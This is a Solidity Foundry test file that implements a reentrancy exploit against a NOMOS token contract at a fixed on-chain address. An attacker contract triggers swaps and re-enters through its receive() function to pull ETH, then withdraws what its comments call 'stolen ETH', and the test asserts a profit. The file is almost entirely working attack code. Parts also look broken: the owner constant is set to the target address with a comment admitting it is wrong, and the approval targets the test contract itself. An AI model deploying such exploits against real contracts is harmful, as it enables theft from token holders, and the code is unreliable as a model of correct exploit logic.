// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INOMOS {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function afterPreSale() external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function marketingAccumulator() external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
}

contract AttackerContract {
    address public target;
    bool private attacking;
    uint256 private reentrancyCount;
    uint256 private constant MAX_REENTRANCY = 3;

    constructor(address _target) {
        target = _target;
    }

    function triggerAttack() external {
        INOMOS token = INOMOS(target);
        address pair = token.uniswapV2Pair();

        // Start the attack by transferring to pair (sell)
        attacking = true;
        reentrancyCount = 0;

        // Transfer tokens to pair to trigger swapAndLiquify
        // This should accumulate marketing fees and trigger swapTokens
        token.transfer(pair, 20000000 * 10**11);

        attacking = false;
    }

    receive() external payable {
        if (attacking && reentrancyCount < MAX_REENTRANCY) {
            reentrancyCount++;

            // Reenter by calling transfer again
            // This will trigger another swapTokens before marketingAccumulator is reset
            INOMOS token = INOMOS(target);
            address pair = token.uniswapV2Pair();

            // Transfer a small amount to trigger another swap
            token.transfer(pair, 1000000 * 10**11);
        }
    }

    // Function to withdraw stolen ETH
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);
    address private constant owner = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc; // Same as target, but we need the actual owner
    address private constant actualOwner = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc; // Initial owner is deployer

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get tokens and prepare the contract
        vm.startPrank(owner);
        INOMOS(TARGET).afterPreSale(); // Enable swapAndLiquify
        vm.stopPrank();

        // Get some NOMOS tokens for the attacker
        deal(TARGET, attacker, 100000000 * 10**11); // Enough to trigger swaps

        // Approve the attacker contract to spend tokens
        INOMOS(TARGET).approve(attacker, type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Deploy attacker contract
        AttackerContract attackerContract = new AttackerContract(TARGET);

        // Transfer some tokens to the attacker contract
        INOMOS(TARGET).transfer(address(attackerContract), 50000000 * 10**11);

        // Build up marketingAccumulator by making transfers
        // First, transfer from attacker to another address to accumulate fees
        address dummy = address(0x123);
        INOMOS(TARGET).transfer(dummy, 1000000 * 10**11);

        // Now trigger the attack by selling tokens through the attacker contract
        attackerContract.triggerAttack();

        // Check that we received ETH (profit)
        uint256 balanceAfter = address(this).balance;
        console.log("ETH balance after attack:", balanceAfter);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
